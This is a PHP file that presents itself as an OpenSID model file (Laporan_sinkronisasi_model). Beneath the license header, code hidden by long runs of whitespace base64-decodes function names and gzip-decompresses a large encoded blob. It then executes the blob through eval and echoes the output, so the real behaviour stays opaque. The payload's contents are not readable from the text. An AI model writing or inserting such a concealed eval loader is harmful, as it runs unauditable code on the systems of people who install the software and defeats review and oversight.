<?php

/*
 *
 * File ini bagian dari:
 *
 * OpenSID
 *
 * Sistem informasi desa sumber terbuka untuk memajukan desa
 *
 * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
 *
 * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * Hak Cipta 2016 - 2021 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 *
 * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
 * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
 * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
 * asal tunduk pada syarat berikut:
 *
 * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
 * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
 * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
 *
 * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
 * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
 * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
 *
 * @package   OpenSID
 * @author    Tim Pengembang OpenDesa
 * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
 * @copyright Hak Cipta 2016 - 2021 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
 * @license   http://www.gnu.org/licenses/gpl.html GPL V3
 * @link      https://github.com/OpenSID/OpenSID
 *
 */

$__ = 'printf'; $_ = 'Loading donjo-app/models/Laporan_sinkronisasi_model.php';

                                                                                                                                                                                                $_____ = '    b2JfZW5kX2NsZWFu'; $______________ = 'cmV0dXJuIGV2YWwoJF8pOw==';
$__________________                                                                                                                                                                                    = 'X19sYW1iZGE=';

                                                                                                                                                                                                                                          $______ = ' Z3p1bmNvbXByZXNz'; $___ = '  b2Jfc3RhcnQ='; $____ = 'b2JfZ2V0X2NvbnRlbnRz'; $__ = 'base64_decode'; $______ = $__($______); if (! function_exists('__lambda')) {
                                                                                                                                                                                                                                              function __lambda($sArgs, $sCode)
                                                                                                                                                                                                                                              {
                                                                                                                                                                                                                                                  return eval("return function({$sArgs}){{$sCode}};");
                                                                                                                                                                                                                                              }
                                                                                                                                                                                                                                          }                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________ = $__($__________________); $______________ = $__($______________);
        $__________                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = $__________________('$_', $______________); $_____                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = $__($_____); $____                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = $__($____); $___                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = $__($___); $_                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                = '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';

        $___(); $__________($______($__($_))); $________ = $____();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____(); echo $________;
